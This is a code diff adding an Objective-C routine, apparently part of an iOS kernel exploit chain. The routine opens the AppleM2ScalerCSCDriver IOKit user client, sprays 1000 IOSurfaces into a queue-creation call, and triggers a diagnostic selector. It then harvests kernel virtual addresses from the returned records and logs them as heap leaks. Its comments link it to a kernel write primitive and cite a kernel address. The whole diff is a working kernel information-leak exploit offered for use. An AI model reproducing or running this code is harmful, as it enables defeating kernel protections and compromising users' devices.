@@ -603,4 +603,100 @@ finish:
     return ret;
 }
 
+/* 2026-11-22 the READBACK — the P130->P114 pair (the 3072-write lane's
+   observation step). findings/2026-11-20_3072_activity_write_recipe.md: the
+   M2Scaler diag machinery is IN-FAMILY with the 3072 write (the ring writer
+   0xfffffff008a01360, entry+0x18=payload/+0x20=opctx; this reader's raw
+   rec+0x18 passthrough = the neighborhood-state mirror). Self-contained,
+   read-only: open (3-retry) -> the 1000-distinct-surface bank (the v5
+   contract: word0=0x3e8, out=NULL,NULL) -> 2 captures (cap0 = the no-event
+   control, cap1 = a benign event) -> parse the 0x7c records' +0x18. */
++ (BOOL)diagReadback:(uint64_t *)kvas outN:(int *)outN max:(int)max
+             logLine:(void (^)(NSString *line))lg {
+    if (!kvas || !outN || max <= 0) return NO;
+    *outN = 0;
+    if (!p114_dlsym()) { if (lg) lg(@"[rdb] dlsym incomplete — no readback (honest)"); return NO; }
+
+    io_connect_t conn = 0;
+    for (int t = 0; t < 3 && !conn; t++) {
+        CFMutableDictionaryRef m = g_p114_match("AppleM2ScalerCSCDriver");
+        io_service_t svc = m ? g_p114_getsvc(g_p114_main, m) : 0;
+        if (svc) {
+            kern_return_t kr = g_p114_open(svc, mach_task_self(), 0, &conn);
+            (void)g_p114_objRelease(svc);
+            if (kr == KERN_SUCCESS && conn) break;
+            conn = 0;
+        }
+        usleep(300000);
+    }
+    if (!conn) { if (lg) lg(@"[rdb] M2Scaler open failed — no readback (honest)"); return NO; }
+
+    static uint32_t sids[1000];
+    static p114_SurfaceRef bank[1000];
+    static uint8_t qBuf[0xFA8];
+    int nb = 0;
+    memset(sids, 0, sizeof sids);
+    memset(bank, 0, sizeof bank);
+    while (nb < 1000) {
+        p114_SurfaceRef s = p114_mk_surface_bytes(g_p114_bankbytes);
+        if (!s) break;
+        uint32_t sid = g_p114_surfID ? g_p114_surfID((void *)s) : 0;
+        if (!sid) { if (g_p114_surfRel) g_p114_surfRel(s); continue; }
+        bank[nb] = s; sids[nb] = sid; nb++;
+    }
+    if (nb < 1000) {
+        if (lg) lg([NSString stringWithFormat:
+            @"[rdb] bank=%d < 1000 — the no-guess law (honest stop)", nb]);
+        for (int i = 0; i < nb && bank[i]; i++)
+            if (g_p114_surfRel) g_p114_surfRel(bank[i]);
+        return NO;
+    }
+    memset(qBuf, 0, sizeof qBuf);
+    *(uint32_t *)(void *)qBuf = 0x3e8;
+    for (int i = 0; i < 1000; i++)
+        *(uint32_t *)(void *)(qBuf + 4 + i * 4) = sids[i];
+    qBuf[0xFA4] = 0x01;
+    kern_return_t krQ = g_p114_callStruct(conn, 6, qBuf, 0xFA8, NULL, NULL);
+    for (int i = 0; i < nb && bank[i]; i++)
+        if (g_p114_surfRel) g_p114_surfRel(bank[i]);   /* the kext holds refs */
+    if (krQ != KERN_SUCCESS) {
+        if (lg) lg([NSString stringWithFormat:
+            @"[rdb] QueueCreate kr=0x%x — no queue, no readback (honest)", krQ]);
+        return NO;
+    }
+
+    int got = 0;
+    for (int c = 0; c < 2; c++) {
+        p114_SurfaceRef surf = (c == 1) ? p114_mk_surface_bytes(g_p114_bankbytes) : NULL;
+        memset(g_p114_out, 0, sizeof g_p114_out);
+        uint64_t in64 = (uint64_t)(uintptr_t)g_p114_out;   /* the v6 {u64 userVA} law */
+        IOReturn kr = g_p114_callStruct(conn, P114_SEL, &in64, P114_IN_BYTES, NULL, NULL);
+        const size_t outLen = 0x200ull * P114_REC_STRIDE + 0x20;
+        if (kr == KERN_SUCCESS) {
+            int recs = (int)((outLen - P114_REC_HDR) / P114_REC_STRIDE);
+            int shown = 0;
+            for (int i = 0; i < recs && got < max; i++) {
+                uint64_t v18;
+                memcpy(&v18, g_p114_out + P114_REC_HDR +
+                       (size_t)i * P114_REC_STRIDE + P114_KV18, 8);
+                if (v18 && p114_kernelish(v18)) {
+                    kvas[got++] = v18; shown++;
+                    @try { [[P007Board shared] recordHeapLeak:v18
+                                                  source:@"p114_m2scaler"]; }
+                    @catch (__unused NSException *e) {}
+                }
+            }
+            if (lg) lg([NSString stringWithFormat:
+                @"[rdb] cap%d (event=%d) recs<512 scanned, kva-hits=%d",
+                c, c == 1, shown]);
+        } else if (lg) {
+            lg([NSString stringWithFormat:@"[rdb] cap%d kr=0x%x (honest)", c, kr]);
+        }
+        if (surf && g_p114_surfRel) g_p114_surfRel(surf);
+        if (c == 0) usleep(250000);
+    }
+    *outN = got;
+    return got > 0;
+}
+
 @end
